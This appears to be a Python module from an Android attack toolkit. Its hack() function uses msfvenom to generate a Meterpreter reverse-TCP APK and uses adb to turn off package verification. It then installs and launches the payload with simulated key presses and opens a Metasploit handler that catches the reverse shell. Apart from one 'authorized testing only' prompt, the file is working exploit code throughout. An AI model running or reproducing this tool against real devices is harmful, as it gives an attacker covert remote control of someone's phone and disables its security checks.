import subprocess
import time
from pathlib import Path

from modules.config import AppConfig
from modules import banner
from modules.console import console, confirm, adb, task_status, get_adb_executable
from modules.connection import get_ip_address, is_valid_ipv4


def hack(config: AppConfig) -> None:
    import os

    os.system(config.clear_cmd)
    console.print(banner.instructions_banner)
    console.print(banner.instruction)
    choice = console.input("[prompt]> [/prompt]")

    if choice != "":
        console.print("[green]Returning to Main Menu.[/green]")
        return

    os.system(config.clear_cmd)
    ip = get_ip_address()
    if ip is None:
        console.print(
            "[yellow]Could not auto-detect LAN IP. Using [bold]127.0.0.1[/bold] — press [bold]M[/bold] to set LHOST.[/yellow]"
        )
        ip = "127.0.0.1"
    lport = "4444"
    console.print(
        f"[cyan]LHOST[/cyan] [white]{ip}[/white]  [cyan]LPORT[/cyan] [white]{lport}[/white]"
    )

    modify = console.input(
        "[yellow]Enter = continue · M = edit LHOST/LPORT[/yellow]> "
    ).lower()

    while modify not in ("m", ""):
        modify = console.input("[red]Enter or M[/red]> ").lower()

    if modify == "m":
        ip = console.input("[cyan]LHOST[/cyan]> ").strip()
        lport_in = console.input("[cyan]LPORT[/cyan]> ").strip()
        if not is_valid_ipv4(ip):
            console.print("[red]Invalid LHOST → 127.0.0.1[/red]")
            ip = "127.0.0.1"
        if lport_in.isdigit() and 1 <= int(lport_in) <= 65535:
            lport = lport_in
        else:
            console.print("[yellow]Invalid LPORT → 4444[/yellow]")

    if not confirm(
        "[bold red]WARNING:[/bold red] Payload install, security settings changes, Metasploit. "
        "Authorized testing only. Continue?"
    ):
        console.print("[green]Cancelled.[/green]")
        return

    console.print(banner.hacking_banner)

    apk_out = Path("test.apk")
    msfvenom = config.msfvenom_path or "msfvenom"
    msfconsole = config.msfconsole_path or "msfconsole"

    with task_status("[info]msfvenom: building APK…[/info]"):
        result = subprocess.run(
            [
                msfvenom,
                "-p",
                "android/meterpreter/reverse_tcp",
                f"LHOST={ip}",
                f"LPORT={lport}",
                "-o",
                str(apk_out),
            ],
            capture_output=True,
            text=True,
        )
    if result.returncode != 0:
        console.print(f"[red]msfvenom failed:[/red] {result.stderr or result.stdout}")
        return
    if not apk_out.is_file():
        console.print("[red]test.apk missing[/red]")
        return

    with task_status("[info]Preparing device (home, verify settings)…[/info]"):
        adb(["shell", "input", "keyevent", "3"])
        adb(["shell", "settings", "put", "global", "package_verifier_enable", "0"])
        adb(["shell", "settings", "put", "global", "verifier_verify_adb_installs", "0"])

    adb_exe = get_adb_executable()
    with task_status("[info]adb install payload…[/info]"):
        subprocess.run([adb_exe or "adb", "install", "-r", str(apk_out)])

    with task_status("[info]Launching payload…[/info]"):
        adb(["shell", "monkey", "-p", "com.metasploit.stage", "1"])
        time.sleep(3)
        adb(["shell", "input", "keyevent", "22"])
        adb(["shell", "input", "keyevent", "22"])
        adb(["shell", "input", "keyevent", "66"])

    console.print("[red]Starting msfconsole handler…[/red]")
    subprocess.run(
        [
            msfconsole,
            "-x",
            f"use exploit/multi/handler ; set PAYLOAD android/meterpreter/reverse_tcp ; "
            f"set LHOST {ip} ; set LPORT {lport} ; exploit",
        ]
    )

    with task_status("[info]Restoring app verification…[/info]"):
        adb(["shell", "settings", "put", "global", "package_verifier_enable", "1"])
        adb(["shell", "settings", "put", "global", "verifier_verify_adb_installs", "1"])
